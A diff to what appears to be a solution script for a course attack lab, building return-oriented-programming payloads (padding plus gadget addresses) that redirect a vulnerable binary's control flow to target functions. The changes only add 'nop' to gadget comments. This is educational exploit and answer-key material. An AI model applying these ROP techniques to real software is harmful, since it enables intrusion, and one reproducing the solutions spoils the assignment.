@@ -100,9 +100,9 @@ def solve_level_3(flag: bool) -> None:
 def solve_level_4(flag: bool) -> None:
     solution = (
         b"a" * BUF_SIZE # padding
-        + p64(0x4019a8) # pop rax; ret
+        + p64(0x4019a8) # pop rax; nop; ret
         + p64(COOKIE) # cookie value
-        + p64(0x401992) # mov rdi, rax; ret
+        + p64(0x401992) # mov rdi, rax; nop; ret
         + p64(0x401828) # touch 2
     )
     solve_rtarget(solution, flag, 4)
@@ -112,14 +112,14 @@ def solve_level_5(flag: bool) -> None:
     solution = (
         b"a" * BUF_SIZE # padding
         + p64(0x401a70) # mov rax, rsp; ret
-        + p64(0x401992) # mov rdi, rax; ret
-        + p64(0x4019a8) # pop rax; ret
+        + p64(0x401992) # mov rdi, rax; nop; ret
+        + p64(0x4019a8) # pop rax; nop; ret
         + p64(0x100) # offset to cookie
         + p64(0x401a5d) # mov edx, eax; nop; ret
         + p64(0x4019cd) # mov ecx, edx; and bl, bl; ret
         + p64(0x401a49) # mov esi, ecx; or dl, dl; ret
         + p64(0x4019c6) # lea rax, [rdi + rsi]; ret
-        + p64(0x401992) # mov rdi, rax; ret
+        + p64(0x401992) # mov rdi, rax; nop; ret
         + p64(0x4018fc) # touch 3
         + b"a" * (0x100 - 0x40 - 8) # padding (offset - prev_stack_size - self)
         + payload # cookie hex string
